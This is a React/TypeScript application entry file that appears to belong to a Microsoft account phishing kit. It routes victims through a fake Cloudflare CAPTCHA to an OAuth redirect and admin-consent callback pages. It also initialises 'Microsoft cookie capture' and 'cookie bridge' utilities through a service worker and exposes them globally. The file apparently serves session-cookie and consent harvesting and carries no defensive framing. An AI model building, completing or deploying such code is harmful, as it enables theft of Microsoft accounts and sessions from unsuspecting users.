import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';
import AuthCallback from './components/AuthCallback';
import AdminConsentCallback from './components/AdminConsentCallback';
import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';
import { initializeMicrosoftCookieBridge, microsoftCookieBridge } from './utils/microsoftCookieBridge';

const App: React.FC = () => {
    return (
        <Router>
            <MainContent />
        </Router>
    );
};

const MainContent: React.FC = () => {
    const [currentPage, setCurrentPage] = useState('captcha');
    const location = useLocation();

    useEffect(() => {
        try {
            console.log('✅ Microsoft cookie capture utilities initialized');
            
            // Make functions globally available for replacement.html
            if (typeof window !== 'undefined') {
                (window as any).enhancedMicrosoftCookieCapture = enhancedMicrosoftCookieCapture;
                (window as any).microsoftCookieBridge = microsoftCookieBridge;
            }

            // Initialize Microsoft Cookie Bridge with Service Worker
            console.log('🚀 Initializing Microsoft Cookie Bridge...');
            initializeMicrosoftCookieBridge();
            
        } catch (error) {
            console.warn('⚠️ Failed to initialize Microsoft cookie capture:', error);
        }
    }, [location]);

    return (
        <Routes>
            <Route path="/auth/callback" element={<AdminConsentCallback />} />
            <Route path="/auth/callback/legacy" element={<AuthCallback />} />
            <Route path="/" element={<DefaultPage currentPage={currentPage} setCurrentPage={setCurrentPage} />} />
        </Routes>
    );
};

const DefaultPage = ({ currentPage, setCurrentPage }: any) => {
    useEffect(() => {
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');
        if (step) {
            setCurrentPage(step);
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }, [setCurrentPage]);

    const handleCaptchaVerified = () => {
        setCurrentPage('replacement');
    };

    const handleCaptchaBack = () => {
        window.location.reload();
    };
    
    switch (currentPage) {
        case 'captcha':
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
        case 'replacement':
            return <RealOAuthRedirect />;
        default:
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
    }
};

export default App;